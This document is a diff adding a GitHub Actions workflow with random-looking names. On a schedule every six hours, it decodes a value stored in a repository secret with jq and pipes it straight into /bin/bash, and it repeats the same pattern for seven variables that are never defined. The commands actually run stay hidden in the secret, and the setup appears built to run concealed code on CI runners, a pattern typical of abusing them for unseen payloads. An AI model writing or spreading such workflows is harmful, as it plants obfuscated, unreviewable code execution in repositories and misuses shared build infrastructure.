@@ -1,0 +1,25 @@
+name: huchunyan3456
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '16 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: huchunyan3456
+        env:
+          s25345: ${{ secrets.s25345 }}
+        run: |
+          echo $s25345 | jq -r .wqod1 | /bin/bash
+          echo $t0 | jq -r .gqw1 | /bin/bash
+          echo $ihuf36674 | jq -r .vieh3254 | /bin/bash
+          echo $mbrt33590 | jq -r .znihb80511 | /bin/bash
+          echo $fl33625 | jq -r .ms5 | /bin/bash
+          echo $x3 | jq -r .t8695 | /bin/bash
+          echo $wpn5 | jq -r .w6 | /bin/bash
+          echo $ftzqw212 | jq -r .ipq8520 | /bin/bash
+
